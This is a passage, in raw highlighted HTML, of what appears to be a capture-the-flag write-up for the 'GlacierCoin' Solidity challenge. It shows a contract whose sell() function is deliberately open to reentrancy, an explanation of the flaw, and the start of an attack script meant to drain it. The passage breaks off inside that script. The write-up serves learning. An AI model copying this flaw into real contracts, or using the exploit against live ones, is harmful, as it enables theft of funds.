&lt;&#x2F;span&gt;&lt;span&gt;        &lt;&#x2F;span&gt;&lt;span style=&quot;color:#f07171;&quot;&gt;require&lt;&#x2F;span&gt;&lt;span&gt;(msg&lt;&#x2F;span&gt;&lt;span style=&quot;color:#ed9366;&quot;&gt;.&lt;&#x2F;span&gt;&lt;span&gt;value &lt;&#x2F;span&gt;&lt;span style=&quot;color:#ed9366;&quot;&gt;== &lt;&#x2F;span&gt;&lt;span style=&quot;color:#ff8f40;&quot;&gt;100 &lt;&#x2F;span&gt;&lt;span&gt;ether)&lt;&#x2F;span&gt;&lt;span style=&quot;color:#61676ccc;&quot;&gt;;
&lt;&#x2F;span&gt;&lt;span&gt;
&lt;&#x2F;span&gt;&lt;span&gt;        &lt;&#x2F;span&gt;&lt;span style=&quot;font-style:italic;color:#abb0b6;&quot;&gt;&#x2F;&#x2F; Deploy the victim contract
&lt;&#x2F;span&gt;&lt;span&gt;        TARGET &lt;&#x2F;span&gt;&lt;span style=&quot;color:#ed9366;&quot;&gt;= new &lt;&#x2F;span&gt;&lt;span style=&quot;color:#399ee6;&quot;&gt;GlacierCoin&lt;&#x2F;span&gt;&lt;span&gt;()&lt;&#x2F;span&gt;&lt;span style=&quot;color:#61676ccc;&quot;&gt;;
&lt;&#x2F;span&gt;&lt;span&gt;
&lt;&#x2F;span&gt;&lt;span&gt;        &lt;&#x2F;span&gt;&lt;span style=&quot;font-style:italic;color:#abb0b6;&quot;&gt;&#x2F;&#x2F; Send 10 ether to the victim contract as initial balance
&lt;&#x2F;span&gt;&lt;span&gt;        TARGET&lt;&#x2F;span&gt;&lt;span style=&quot;color:#ed9366;&quot;&gt;.&lt;&#x2F;span&gt;&lt;span&gt;buy{&lt;&#x2F;span&gt;&lt;span style=&quot;color:#399ee6;&quot;&gt;value&lt;&#x2F;span&gt;&lt;span style=&quot;color:#61676ccc;&quot;&gt;: &lt;&#x2F;span&gt;&lt;span style=&quot;color:#ff8f40;&quot;&gt;10 &lt;&#x2F;span&gt;&lt;span&gt;ether}()&lt;&#x2F;span&gt;&lt;span style=&quot;color:#61676ccc;&quot;&gt;;
&lt;&#x2F;span&gt;&lt;span&gt;    }
&lt;&#x2F;span&gt;&lt;span&gt;
&lt;&#x2F;span&gt;&lt;span&gt;    &lt;&#x2F;span&gt;&lt;span style=&quot;font-style:italic;color:#abb0b6;&quot;&gt;&#x2F;&#x2F; Our challenge in the CTF framework will call this function to
&lt;&#x2F;span&gt;&lt;span&gt;    &lt;&#x2F;span&gt;&lt;span style=&quot;font-style:italic;color:#abb0b6;&quot;&gt;&#x2F;&#x2F; check whether the player has solved the challenge or not.
&lt;&#x2F;span&gt;&lt;span&gt;    &lt;&#x2F;span&gt;&lt;span style=&quot;color:#fa6e32;&quot;&gt;function &lt;&#x2F;span&gt;&lt;span style=&quot;color:#f29718;&quot;&gt;isSolved&lt;&#x2F;span&gt;&lt;span&gt;() &lt;&#x2F;span&gt;&lt;span style=&quot;color:#f29718;&quot;&gt;public view returns &lt;&#x2F;span&gt;&lt;span&gt;(&lt;&#x2F;span&gt;&lt;span style=&quot;color:#ff8f40;&quot;&gt;bool&lt;&#x2F;span&gt;&lt;span&gt;) {
&lt;&#x2F;span&gt;&lt;span&gt;        &lt;&#x2F;span&gt;&lt;span style=&quot;color:#fa6e32;&quot;&gt;return &lt;&#x2F;span&gt;&lt;span style=&quot;color:#f29718;&quot;&gt;address&lt;&#x2F;span&gt;&lt;span&gt;(TARGET)&lt;&#x2F;span&gt;&lt;span style=&quot;color:#ed9366;&quot;&gt;.&lt;&#x2F;span&gt;&lt;span&gt;balance &lt;&#x2F;span&gt;&lt;span style=&quot;color:#ed9366;&quot;&gt;== &lt;&#x2F;span&gt;&lt;span style=&quot;color:#ff8f40;&quot;&gt;0&lt;&#x2F;span&gt;&lt;span style=&quot;color:#61676ccc;&quot;&gt;;
&lt;&#x2F;span&gt;&lt;span&gt;    }
&lt;&#x2F;span&gt;&lt;span&gt;}
&lt;&#x2F;span&gt;&lt;&#x2F;code&gt;&lt;&#x2F;pre&gt;
&lt;p&gt;&lt;code&gt;Challenge.sol&lt;&#x2F;code&gt;&lt;&#x2F;p&gt;
&lt;pre data-lang=&quot;javascript&quot; style=&quot;background-color:#fafafa;color:#61676c;&quot; class=&quot;language-javascript &quot;&gt;&lt;code class=&quot;language-javascript&quot; data-lang=&quot;javascript&quot;&gt;&lt;span&gt;
&lt;&#x2F;span&gt;&lt;span style=&quot;font-style:italic;color:#abb0b6;&quot;&gt;&#x2F;&#x2F; SPDX-License-Identifier: MIT
&lt;&#x2F;span&gt;&lt;span&gt;pragma solidity &lt;&#x2F;span&gt;&lt;span style=&quot;color:#ed9366;&quot;&gt;^&lt;&#x2F;span&gt;&lt;span style=&quot;color:#ff8f40;&quot;&gt;0.8&lt;&#x2F;span&gt;&lt;span style=&quot;color:#ed9366;&quot;&gt;.&lt;&#x2F;span&gt;&lt;span style=&quot;color:#ff8f40;&quot;&gt;18&lt;&#x2F;span&gt;&lt;span style=&quot;color:#61676ccc;&quot;&gt;;
&lt;&#x2F;span&gt;&lt;span&gt;
&lt;&#x2F;span&gt;&lt;span&gt;contract GlacierCoin
&lt;&#x2F;span&gt;&lt;span&gt;{
&lt;&#x2F;span&gt;&lt;span&gt;    address owner&lt;&#x2F;span&gt;&lt;span style=&quot;color:#61676ccc;&quot;&gt;;
&lt;&#x2F;span&gt;&lt;span&gt;    &lt;&#x2F;span&gt;&lt;span style=&quot;color:#f29718;&quot;&gt;mapping&lt;&#x2F;span&gt;&lt;span&gt;(&lt;&#x2F;span&gt;&lt;span style=&quot;color:#ff8f40;&quot;&gt;address &lt;&#x2F;span&gt;&lt;span style=&quot;color:#fa6e32;&quot;&gt;=&amp;gt; &lt;&#x2F;span&gt;&lt;span&gt;uint) public balances&lt;&#x2F;span&gt;&lt;span style=&quot;color:#61676ccc;&quot;&gt;;
&lt;&#x2F;span&gt;&lt;span&gt;    &lt;&#x2F;span&gt;&lt;span style=&quot;color:#f29718;&quot;&gt;mapping&lt;&#x2F;span&gt;&lt;span&gt;(&lt;&#x2F;span&gt;&lt;span style=&quot;color:#ff8f40;&quot;&gt;address &lt;&#x2F;span&gt;&lt;span style=&quot;color:#fa6e32;&quot;&gt;=&amp;gt; &lt;&#x2F;span&gt;&lt;span&gt;uint) public frozen&lt;&#x2F;span&gt;&lt;span style=&quot;color:#61676ccc;&quot;&gt;;
&lt;&#x2F;span&gt;&lt;span&gt;    &lt;&#x2F;span&gt;&lt;span style=&quot;color:#f29718;&quot;&gt;constructor&lt;&#x2F;span&gt;&lt;span&gt;() 
&lt;&#x2F;span&gt;&lt;span&gt;    {
&lt;&#x2F;span&gt;&lt;span&gt;        owner &lt;&#x2F;span&gt;&lt;span style=&quot;color:#ed9366;&quot;&gt;= &lt;&#x2F;span&gt;&lt;span&gt;msg&lt;&#x2F;span&gt;&lt;span style=&quot;color:#ed9366;&quot;&gt;.&lt;&#x2F;span&gt;&lt;span&gt;sender&lt;&#x2F;span&gt;&lt;span style=&quot;color:#61676ccc;&quot;&gt;;
&lt;&#x2F;span&gt;&lt;span&gt;    }
&lt;&#x2F;span&gt;&lt;span&gt;    &lt;&#x2F;span&gt;&lt;span style=&quot;font-style:italic;color:#abb0b6;&quot;&gt;&#x2F;&#x2F;This is the function you need to call to buy tokens
&lt;&#x2F;span&gt;&lt;span&gt;    &lt;&#x2F;span&gt;&lt;span style=&quot;color:#fa6e32;&quot;&gt;function &lt;&#x2F;span&gt;&lt;span style=&quot;color:#f29718;&quot;&gt;buy&lt;&#x2F;span&gt;&lt;span&gt;() &lt;&#x2F;span&gt;&lt;span style=&quot;color:#f29718;&quot;&gt;public payable
&lt;&#x2F;span&gt;&lt;span&gt;    {
&lt;&#x2F;span&gt;&lt;span&gt;        &lt;&#x2F;span&gt;&lt;span style=&quot;color:#f29718;&quot;&gt;_mint&lt;&#x2F;span&gt;&lt;span&gt;(msg&lt;&#x2F;span&gt;&lt;span style=&quot;color:#ed9366;&quot;&gt;.&lt;&#x2F;span&gt;&lt;span&gt;value&lt;&#x2F;span&gt;&lt;span style=&quot;color:#61676ccc;&quot;&gt;, &lt;&#x2F;span&gt;&lt;span&gt;msg&lt;&#x2F;span&gt;&lt;span style=&quot;color:#ed9366;&quot;&gt;.&lt;&#x2F;span&gt;&lt;span&gt;sender)&lt;&#x2F;span&gt;&lt;span style=&quot;color:#61676ccc;&quot;&gt;;
&lt;&#x2F;span&gt;&lt;span&gt;    }
&lt;&#x2F;span&gt;&lt;span&gt;    &lt;&#x2F;span&gt;&lt;span style=&quot;font-style:italic;color:#abb0b6;&quot;&gt;&#x2F;&#x2F;This is the function you need to call to burn tokens
&lt;&#x2F;span&gt;&lt;span&gt;    &lt;&#x2F;span&gt;&lt;span style=&quot;color:#fa6e32;&quot;&gt;function &lt;&#x2F;span&gt;&lt;span style=&quot;color:#f29718;&quot;&gt;burn&lt;&#x2F;span&gt;&lt;span&gt;(&lt;&#x2F;span&gt;&lt;span style=&quot;color:#ff8f40;&quot;&gt;uint256 amount&lt;&#x2F;span&gt;&lt;span&gt;) &lt;&#x2F;span&gt;&lt;span style=&quot;color:#f29718;&quot;&gt;public
&lt;&#x2F;span&gt;&lt;span&gt;    {
&lt;&#x2F;span&gt;&lt;span&gt;        &lt;&#x2F;span&gt;&lt;span style=&quot;color:#f07171;&quot;&gt;require&lt;&#x2F;span&gt;&lt;span&gt;(balances[msg&lt;&#x2F;span&gt;&lt;span style=&quot;color:#ed9366;&quot;&gt;.&lt;&#x2F;span&gt;&lt;span&gt;sender] &lt;&#x2F;span&gt;&lt;span style=&quot;color:#ed9366;&quot;&gt;&amp;gt;= &lt;&#x2F;span&gt;&lt;span&gt;amount&lt;&#x2F;span&gt;&lt;span style=&quot;color:#61676ccc;&quot;&gt;, &lt;&#x2F;span&gt;&lt;span style=&quot;color:#86b300;&quot;&gt;&amp;quot;You can not burn this much as you are poor af&amp;quot;&lt;&#x2F;span&gt;&lt;span&gt;)&lt;&#x2F;span&gt;&lt;span style=&quot;color:#61676ccc;&quot;&gt;;
&lt;&#x2F;span&gt;&lt;span&gt;        balances[msg&lt;&#x2F;span&gt;&lt;span style=&quot;color:#ed9366;&quot;&gt;.&lt;&#x2F;span&gt;&lt;span&gt;sender] &lt;&#x2F;span&gt;&lt;span style=&quot;color:#ed9366;&quot;&gt;-= &lt;&#x2F;span&gt;&lt;span&gt;amount&lt;&#x2F;span&gt;&lt;span style=&quot;color:#61676ccc;&quot;&gt;;
&lt;&#x2F;span&gt;&lt;span&gt;    }
&lt;&#x2F;span&gt;&lt;span&gt;    &lt;&#x2F;span&gt;&lt;span style=&quot;font-style:italic;color:#abb0b6;&quot;&gt;&#x2F;&#x2F;This is a even cooler contract than ERC20 you can not only burn, but also freeze your token. 
&lt;&#x2F;span&gt;&lt;span&gt;    &lt;&#x2F;span&gt;&lt;span style=&quot;color:#fa6e32;&quot;&gt;function &lt;&#x2F;span&gt;&lt;span style=&quot;color:#f29718;&quot;&gt;freeze&lt;&#x2F;span&gt;&lt;span&gt;(&lt;&#x2F;span&gt;&lt;span style=&quot;color:#ff8f40;&quot;&gt;uint256 amount&lt;&#x2F;span&gt;&lt;span&gt;) &lt;&#x2F;span&gt;&lt;span style=&quot;color:#f29718;&quot;&gt;public
&lt;&#x2F;span&gt;&lt;span&gt;    {
&lt;&#x2F;span&gt;&lt;span&gt;        &lt;&#x2F;span&gt;&lt;span style=&quot;color:#f07171;&quot;&gt;require&lt;&#x2F;span&gt;&lt;span&gt;(balances[msg&lt;&#x2F;span&gt;&lt;span style=&quot;color:#ed9366;&quot;&gt;.&lt;&#x2F;span&gt;&lt;span&gt;sender] &lt;&#x2F;span&gt;&lt;span style=&quot;color:#ed9366;&quot;&gt;&amp;gt;= &lt;&#x2F;span&gt;&lt;span&gt;amount&lt;&#x2F;span&gt;&lt;span style=&quot;color:#61676ccc;&quot;&gt;, &lt;&#x2F;span&gt;&lt;span style=&quot;color:#86b300;&quot;&gt;&amp;quot;You can not freeze this much as you are poor af&amp;quot;&lt;&#x2F;span&gt;&lt;span&gt;)&lt;&#x2F;span&gt;&lt;span style=&quot;color:#61676ccc;&quot;&gt;;
&lt;&#x2F;span&gt;&lt;span&gt;        frozen[msg&lt;&#x2F;span&gt;&lt;span style=&quot;color:#ed9366;&quot;&gt;.&lt;&#x2F;span&gt;&lt;span&gt;sender] &lt;&#x2F;span&gt;&lt;span style=&quot;color:#ed9366;&quot;&gt;+= &lt;&#x2F;span&gt;&lt;span&gt;amount&lt;&#x2F;span&gt;&lt;span style=&quot;color:#61676ccc;&quot;&gt;;
&lt;&#x2F;span&gt;&lt;span&gt;        balances[msg&lt;&#x2F;span&gt;&lt;span style=&quot;color:#ed9366;&quot;&gt;.&lt;&#x2F;span&gt;&lt;span&gt;sender] &lt;&#x2F;span&gt;&lt;span style=&quot;color:#ed9366;&quot;&gt;-= &lt;&#x2F;span&gt;&lt;span&gt;amount&lt;&#x2F;span&gt;&lt;span style=&quot;color:#61676ccc;&quot;&gt;;
&lt;&#x2F;span&gt;&lt;span&gt;    }
&lt;&#x2F;span&gt;&lt;span&gt;    &lt;&#x2F;span&gt;&lt;span style=&quot;font-style:italic;color:#abb0b6;&quot;&gt;&#x2F;&#x2F;You can even unfreeze your token, but you can only unfreeze as much as you have frozen
&lt;&#x2F;span&gt;&lt;span&gt;    &lt;&#x2F;span&gt;&lt;span style=&quot;color:#fa6e32;&quot;&gt;function &lt;&#x2F;span&gt;&lt;span style=&quot;color:#f29718;&quot;&gt;defrost&lt;&#x2F;span&gt;&lt;span&gt;(&lt;&#x2F;span&gt;&lt;span style=&quot;color:#ff8f40;&quot;&gt;uint256 amount&lt;&#x2F;span&gt;&lt;span&gt;) &lt;&#x2F;span&gt;&lt;span style=&quot;color:#f29718;&quot;&gt;public
&lt;&#x2F;span&gt;&lt;span&gt;    {
&lt;&#x2F;span&gt;&lt;span&gt;        &lt;&#x2F;span&gt;&lt;span style=&quot;color:#f07171;&quot;&gt;require&lt;&#x2F;span&gt;&lt;span&gt;(frozen[msg&lt;&#x2F;span&gt;&lt;span style=&quot;color:#ed9366;&quot;&gt;.&lt;&#x2F;span&gt;&lt;span&gt;sender] &lt;&#x2F;span&gt;&lt;span style=&quot;color:#ed9366;&quot;&gt;&amp;gt;= &lt;&#x2F;span&gt;&lt;span&gt;amount&lt;&#x2F;span&gt;&lt;span style=&quot;color:#61676ccc;&quot;&gt;, &lt;&#x2F;span&gt;&lt;span style=&quot;color:#86b300;&quot;&gt;&amp;quot;You can not unfreeze this much&amp;quot;&lt;&#x2F;span&gt;&lt;span&gt;)&lt;&#x2F;span&gt;&lt;span style=&quot;color:#61676ccc;&quot;&gt;;
&lt;&#x2F;span&gt;&lt;span&gt;        frozen[msg&lt;&#x2F;span&gt;&lt;span style=&quot;color:#ed9366;&quot;&gt;.&lt;&#x2F;span&gt;&lt;span&gt;sender] &lt;&#x2F;span&gt;&lt;span style=&quot;color:#ed9366;&quot;&gt;-= &lt;&#x2F;span&gt;&lt;span&gt;amount&lt;&#x2F;span&gt;&lt;span style=&quot;color:#61676ccc;&quot;&gt;;
&lt;&#x2F;span&gt;&lt;span&gt;        balances[msg&lt;&#x2F;span&gt;&lt;span style=&quot;color:#ed9366;&quot;&gt;.&lt;&#x2F;span&gt;&lt;span&gt;sender] &lt;&#x2F;span&gt;&lt;span style=&quot;color:#ed9366;&quot;&gt;+= &lt;&#x2F;span&gt;&lt;span&gt;amount&lt;&#x2F;span&gt;&lt;span style=&quot;color:#61676ccc;&quot;&gt;;
&lt;&#x2F;span&gt;&lt;span&gt;    }
&lt;&#x2F;span&gt;&lt;span&gt;    &lt;&#x2F;span&gt;&lt;span style=&quot;font-style:italic;color:#abb0b6;&quot;&gt;&#x2F;&#x2F;You can even sell your token for ether, but you can only sell as much as you have
&lt;&#x2F;span&gt;&lt;span&gt;    &lt;&#x2F;span&gt;&lt;span style=&quot;color:#fa6e32;&quot;&gt;function &lt;&#x2F;span&gt;&lt;span style=&quot;color:#f29718;&quot;&gt;sell&lt;&#x2F;span&gt;&lt;span&gt;(&lt;&#x2F;span&gt;&lt;span style=&quot;color:#ff8f40;&quot;&gt;uint256 amount&lt;&#x2F;span&gt;&lt;span&gt;) &lt;&#x2F;span&gt;&lt;span style=&quot;color:#f29718;&quot;&gt;public
&lt;&#x2F;span&gt;&lt;span&gt;    {
&lt;&#x2F;span&gt;&lt;span&gt;        &lt;&#x2F;span&gt;&lt;span style=&quot;color:#f07171;&quot;&gt;require&lt;&#x2F;span&gt;&lt;span&gt;(balances[msg&lt;&#x2F;span&gt;&lt;span style=&quot;color:#ed9366;&quot;&gt;.&lt;&#x2F;span&gt;&lt;span&gt;sender] &lt;&#x2F;span&gt;&lt;span style=&quot;color:#ed9366;&quot;&gt;&amp;gt;= &lt;&#x2F;span&gt;&lt;span&gt;amount&lt;&#x2F;span&gt;&lt;span style=&quot;color:#61676ccc;&quot;&gt;, &lt;&#x2F;span&gt;&lt;span style=&quot;color:#86b300;&quot;&gt;&amp;quot;You can not sell this much as you are poor af&amp;quot;&lt;&#x2F;span&gt;&lt;span&gt;)&lt;&#x2F;span&gt;&lt;span style=&quot;color:#61676ccc;&quot;&gt;;
&lt;&#x2F;span&gt;&lt;span&gt;        uint256 new_balance &lt;&#x2F;span&gt;&lt;span style=&quot;color:#ed9366;&quot;&gt;= &lt;&#x2F;span&gt;&lt;span&gt;balances[msg&lt;&#x2F;span&gt;&lt;span style=&quot;color:#ed9366;&quot;&gt;.&lt;&#x2F;span&gt;&lt;span&gt;sender] &lt;&#x2F;span&gt;&lt;span style=&quot;color:#ed9366;&quot;&gt;- &lt;&#x2F;span&gt;&lt;span&gt;amount&lt;&#x2F;span&gt;&lt;span style=&quot;color:#61676ccc;&quot;&gt;;
&lt;&#x2F;span&gt;&lt;span&gt;        (msg&lt;&#x2F;span&gt;&lt;span style=&quot;color:#ed9366;&quot;&gt;.&lt;&#x2F;span&gt;&lt;span&gt;sender)&lt;&#x2F;span&gt;&lt;span style=&quot;color:#ed9366;&quot;&gt;.&lt;&#x2F;span&gt;&lt;span&gt;call{&lt;&#x2F;span&gt;&lt;span style=&quot;color:#399ee6;&quot;&gt;value&lt;&#x2F;span&gt;&lt;span style=&quot;color:#61676ccc;&quot;&gt;: &lt;&#x2F;span&gt;&lt;span&gt;amount}(&lt;&#x2F;span&gt;&lt;span style=&quot;color:#86b300;&quot;&gt;&amp;quot;&amp;quot;&lt;&#x2F;span&gt;&lt;span&gt;)&lt;&#x2F;span&gt;&lt;span style=&quot;color:#61676ccc;&quot;&gt;;
&lt;&#x2F;span&gt;&lt;span&gt;        balances[msg&lt;&#x2F;span&gt;&lt;span style=&quot;color:#ed9366;&quot;&gt;.&lt;&#x2F;span&gt;&lt;span&gt;sender] &lt;&#x2F;span&gt;&lt;span style=&quot;color:#ed9366;&quot;&gt;= &lt;&#x2F;span&gt;&lt;span&gt;new_balance&lt;&#x2F;span&gt;&lt;span style=&quot;color:#61676ccc;&quot;&gt;;
&lt;&#x2F;span&gt;&lt;span&gt;    }
&lt;&#x2F;span&gt;&lt;span&gt;    &lt;&#x2F;span&gt;&lt;span style=&quot;font-style:italic;color:#abb0b6;&quot;&gt;&#x2F;&#x2F;Internal functions (These shouldn&amp;#39;t interest you)
&lt;&#x2F;span&gt;&lt;span&gt;    &lt;&#x2F;span&gt;&lt;span style=&quot;color:#fa6e32;&quot;&gt;function &lt;&#x2F;span&gt;&lt;span style=&quot;color:#f29718;&quot;&gt;_mint&lt;&#x2F;span&gt;&lt;span&gt;(&lt;&#x2F;span&gt;&lt;span style=&quot;color:#ff8f40;&quot;&gt;uint256 amount&lt;&#x2F;span&gt;&lt;span style=&quot;color:#61676ccc;&quot;&gt;, &lt;&#x2F;span&gt;&lt;span style=&quot;color:#ff8f40;&quot;&gt;address target&lt;&#x2F;span&gt;&lt;span&gt;) &lt;&#x2F;span&gt;&lt;span style=&quot;color:#f29718;&quot;&gt;internal
&lt;&#x2F;span&gt;&lt;span&gt;    {
&lt;&#x2F;span&gt;&lt;span&gt;        balances[target] &lt;&#x2F;span&gt;&lt;span style=&quot;color:#ed9366;&quot;&gt;+= &lt;&#x2F;span&gt;&lt;span&gt;amount&lt;&#x2F;span&gt;&lt;span style=&quot;color:#61676ccc;&quot;&gt;;
&lt;&#x2F;span&gt;&lt;span&gt;    }   
&lt;&#x2F;span&gt;&lt;span&gt;}
&lt;&#x2F;span&gt;&lt;span&gt;
&lt;&#x2F;span&gt;&lt;&#x2F;code&gt;&lt;&#x2F;pre&gt;
&lt;p&gt;Observations :&lt;&#x2F;p&gt;
&lt;ol&gt;
&lt;li&gt;We are given with setup contract address&lt;&#x2F;li&gt;
&lt;li&gt;Setup contract deployes the GlacierCoin contract and funds with 10 ether&lt;&#x2F;li&gt;
&lt;li&gt;GlacierCoin is a non-standard token contracts with buy, sell, freeze features&lt;&#x2F;li&gt;
&lt;&#x2F;ol&gt;
&lt;p&gt;Goal :&lt;&#x2F;p&gt;
&lt;ul&gt;
&lt;li&gt;The goal is to make the GlacierCoin balance 0 (look at isSolved() in Setup)&lt;&#x2F;li&gt;
&lt;&#x2F;ul&gt;
&lt;p&gt;We can simply look at the &lt;code&gt;sell()&lt;&#x2F;code&gt; function which is susceptable to the great &lt;code&gt;Reentrancy&lt;&#x2F;code&gt;. The balance of the sender updated after the external call. So, we can simply write an Attack contract with a fallback function &lt;code&gt;Reenter&lt;&#x2F;code&gt; into the &lt;code&gt;sell()&lt;&#x2F;code&gt; function.&lt;&#x2F;p&gt;
&lt;p&gt;Attack :&lt;&#x2F;p&gt;
&lt;ol&gt;
&lt;li&gt;Buy 10 coins in GlacierCoin with 10 ether&lt;&#x2F;li&gt;
&lt;li&gt;Sell it back&lt;&#x2F;li&gt;
&lt;li&gt;Reenter into sell again from fallback&lt;&#x2F;li&gt;
&lt;&#x2F;ol&gt;
&lt;p&gt;&lt;code&gt;Attack.s.sol&lt;&#x2F;code&gt; :&lt;&#x2F;p&gt;
&lt;pre data-lang=&quot;javascript&quot; style=&quot;background-color:#fafafa;color:#61676c;&quot; class=&quot;language-javascript &quot;&gt;&lt;code class=&quot;language-javascript&quot; data-lang=&quot;javascript&quot;&gt;&lt;span style=&quot;font-style:italic;color:#abb0b6;&quot;&gt;&#x2F;&#x2F; SPDX-License-Identifier: MIT
&lt;&#x2F;span&gt;&lt;span&gt;pragma solidity &lt;&#x2F;span&gt;&lt;span style=&quot;color:#ed9366;&quot;&gt;^&lt;&#x2F;span&gt;&lt;span style=&quot;color:#ff8f40;&quot;&gt;0.8&lt;&#x2F;span&gt;&lt;span style=&quot;color:#ed9366;&quot;&gt;.&lt;&#x2F;span&gt;&lt;span style=&quot;color:#ff8f40;&quot;&gt;18&lt;&#x2F;span&gt;&lt;span style=&quot;color:#61676ccc;&quot;&gt;;
&lt;&#x2F;span&gt;&lt;span style=&quot;color:#fa6e32;&quot;&gt;import &lt;&#x2F;span&gt;&lt;span&gt;{Setup} &lt;&#x2F;span&gt;&lt;span style=&quot;color:#fa6e32;&quot;&gt;from &lt;&#x2F;span&gt;&lt;span style=&quot;color:#86b300;&quot;&gt;&amp;quot;..&#x2F;src&#x2F;GlacierCoin&#x2F;Setup.sol&amp;quot;&lt;&#x2F;span&gt;&lt;span style=&quot;color:#61676ccc;&quot;&gt;;
&lt;&#x2F;span&gt;&lt;span style=&quot;color:#fa6e32;&quot;&gt;import &lt;&#x2F;span&gt;&lt;span&gt;{GlacierCoin} &lt;&#x2F;span&gt;&lt;span style=&quot;color:#fa6e32;&quot;&gt;from &lt;&#x2F;span&gt;&lt;span style=&quot;color:#86b300;&quot;&gt;&amp;quot;..&#x2F;src&#x2F;GlacierCoin&#x2F;Challenge.sol&amp;quot;&lt;&#x2F;span&gt;&lt;span style=&quot;color:#61676ccc;&quot;&gt;;
&lt;&#x2F;span&gt;&lt;span style=&quot;color:#fa6e32;&quot;&gt;import &lt;&#x2F;span&gt;&lt;span&gt;{Script} &lt;&#x2F;span&gt;&lt;span style=&quot;color:#fa6e32;&quot;&gt;from &lt;&#x2F;span&gt;&lt;span style=&quot;color:#86b300;&quot;&gt;&amp;quot;forge-std&#x2F;Script.sol&amp;quot;&lt;&#x2F;span&gt;&lt;span style=&quot;color:#61676ccc;&quot;&gt;;
&lt;&#x2F;span&gt;&lt;span style=&quot;color:#fa6e32;&quot;&gt;import &lt;&#x2F;span&gt;&lt;span&gt;{console} &lt;&#x2F;span&gt;&lt;span style=&quot;color:#fa6e32;&quot;&gt;from &lt;&#x2F;span&gt;&lt;span style=&quot;color:#86b300;&quot;&gt;&amp;quot;forge-std&#x2F;console.sol&amp;quot;&lt;&#x2F;span&gt;&lt;span style=&quot;color:#61676ccc;&quot;&gt;;
&lt;&#x2F;span&gt;&lt;span&gt;
&lt;&#x2F;span&gt;&lt;span&gt;contract AttackScript is Script{
&lt;&#x2F;span&gt;&lt;span&gt;    &lt;&#x2F;span&gt;&lt;span style=&quot;color:#fa6e32;&quot;&gt;function &lt;&#x2F;span&gt;&lt;span style=&quot;color:#f29718;&quot;&gt;run&lt;&#x2F;span&gt;&lt;span&gt;() &lt;&#x2F;span&gt;&lt;span style=&quot;color:#f29718;&quot;&gt;public&lt;&#x2F;span&gt;&lt;span&gt;{
&lt;&#x2F;span&gt;&lt;span&gt;        vm&lt;&#x2F;span&gt;&lt;span style=&quot;color:#ed9366;&quot;&gt;.&lt;&#x2F;span&gt;&lt;span style=&quot;color:#f29718;&quot;&gt;startBroadcast&lt;&#x2F;span&gt;&lt;span&gt;()&lt;&#x2F;span&gt;&lt;span style=&quot;color:#61676ccc;&quot;&gt;;
&lt;&#x2F;span&gt;&lt;span&gt;        &lt;&#x2F;span&gt;&lt;span style=&quot;color:#ed9366;&quot;&gt;new &lt;&#x2F;span&gt;&lt;span style=&quot;color:#399ee6;&quot;&gt;Attack&lt;&#x2F;span&gt;&lt;span&gt;{value&lt;&#x2F;span&gt;&lt;span style=&quot;color:#ed9366;&quot;&gt;: &lt;&#x2F;span&gt;&lt;span style=&quot;color:#ff8f40;&quot;&gt;20 &lt;&#x2F;span&gt;&lt;span style=&quot;color:#399ee6;&quot;&gt;ether&lt;&#x2F;span&gt;&lt;span&gt;}()&lt;&#x2F;span&gt;&lt;span style=&quot;color:#ed9366;&quot;&gt;.&lt;&#x2F;span&gt;&lt;span style=&quot;color:#f29718;&quot;&gt;exploit&lt;&#x2F;span&gt;&lt;span&gt;()&lt;&#x2F;span&gt;&lt;span style=&quot;color:#61676ccc;&quot;&gt;;
&lt;&#x2F;span&gt;&lt;span&gt;        &lt;&#x2F;span&gt;&lt;span style=&quot;font-style:italic;color:#55b4d4;&quot;&gt;console&lt;&#x2F;span&gt;&lt;span style=&quot;color:#ed9366;&quot;&gt;.&lt;&#x2F;span&gt;&lt;span style=&quot;color:#f07171;&quot;&gt;log&lt;&#x2F;span&gt;&lt;span&gt;(&lt;&#x2F;span&gt;&lt;span style=&quot;color:#86b300;&quot;&gt;&amp;quot;Attack Success&amp;quot;&lt;&#x2F;span&gt;&lt;span&gt;)&lt;&#x2F;span&gt;&lt;span style=&quot;color:#61676ccc;&quot;&gt;;
&lt;&#x2F;span&gt;&lt;span&gt;        vm&lt;&#x2F;span&gt;&lt;span style=&quot;color:#ed9366;&quot;&gt;.&lt;&#x2F;span&gt;&lt;span style=&quot;color:#f29718;&quot;&gt;stopBroadcast&lt;&#x2F;span&gt;&lt;span&gt;()&lt;&#x2F;span&gt;&lt;span style=&quot;color:#61676ccc;&quot;&gt;;
&lt;&#x2F;span&gt;&lt;span&gt;    }
&lt;&#x2F;span&gt;&lt;span&gt;}
&lt;&#x2F;span&gt;&lt;span&gt;
&lt;&#x2F;span&gt;&lt;span&gt;contract Attack{
&lt;&#x2F;span&gt;&lt;span&gt;    Setup public setupContract &lt;&#x2F;span&gt;&lt;span style=&quot;color:#ed9366;&quot;&gt;= &lt;&#x2F;span&gt;&lt;span style=&quot;color:#f29718;&quot;&gt;Setup&lt;&#x2F;span&gt;&lt;span&gt;(&lt;&#x2F;span&gt;&lt;span style=&quot;color:#ff8f40;&quot;&gt;0x1163C62DE50f6f148e3deA99cA65EBAff3fab967&lt;&#x2F;span&gt;&lt;span&gt;)&lt;&#x2F;span&gt;&lt;span style=&quot;color:#61676ccc;&quot;&gt;;
&lt;&#x2F;span&gt;&lt;span&gt;    GlacierCoin public TARGET &lt;&#x2F;span&gt;&lt;span style=&quot;color:#ed9366;&quot;&gt;= &lt;&#x2F;span&gt;&lt;span style=&quot;color:#f29718;&quot;&gt;GlacierCoin&lt;&#x2F;span&gt;&lt;span&gt;(&lt;&#x2F;span&gt;&lt;span style=&quot;color:#f29718;&quot;&gt;address&lt;&#x2F;span&gt;&lt;span&gt;(setupContract&lt;&#x2F;span&gt;&lt;span style=&quot;color:#ed9366;&quot;&gt;.&lt;&#x2F;span&gt;&lt;span style=&quot;color:#f29718;&quot;&gt;TARGET&lt;&#x2F;span&gt;&lt;span&gt;()))&lt;&#x2F;span&gt;&lt;span style=&quot;color:#61676ccc;&quot;&gt;;
&lt;&#x2F;span&gt;&lt;span&gt;    &lt;&#x2F;span&gt;&lt;span style=&quot;color:#f29718;&quot;&gt;constructor&lt;&#x2F;span&gt;&lt;span&gt;() payable {
